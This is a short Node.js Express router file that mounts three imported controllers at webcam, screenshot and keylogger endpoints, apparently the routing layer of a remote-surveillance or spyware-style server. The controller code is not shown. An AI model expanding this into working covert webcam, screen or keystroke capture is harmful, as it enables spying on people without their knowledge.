const express = require('express');
const router = express.Router();
const webCam = require('./webCamController');
const screenShot = require('./screenshotController');
const keyLogger = require('./keyLoggerController');

router.use("/webcam", webCam);
router.use("/screenshot", screenShot);
router.use("/keylogger", keyLogger);

module.exports = router;
